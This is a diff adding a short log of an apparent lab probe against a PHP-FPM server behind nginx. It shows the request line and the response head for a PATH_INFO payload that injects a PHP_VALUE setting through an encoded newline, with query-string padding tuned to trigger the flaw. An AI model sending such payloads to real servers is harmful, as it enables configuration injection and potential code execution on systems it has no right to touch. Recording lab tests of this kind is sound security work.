@@ -1,0 +1,14 @@
+# PathInfo payload : '/PHP_VALUE\nsession.auto_start=1;;;'
+# query length    : 1759  (qsl=1760, delta=2)
+# request line    : /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ...(1806 bytes)
+# --- raw response head ---
+HTTP/1.1 200 OK
+Server: nginx/1.31.8
+Date: Fri, 23 Oct 2026 09:40:27 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: close
+X-Powered-By: PHP/7.2.23
+X-Lab: fpmalt
+# body[:200]: 11 | FPMALT-OK 7.2.23 |  | 0 |  | 
+# SET-COOKIE PRESENT: False
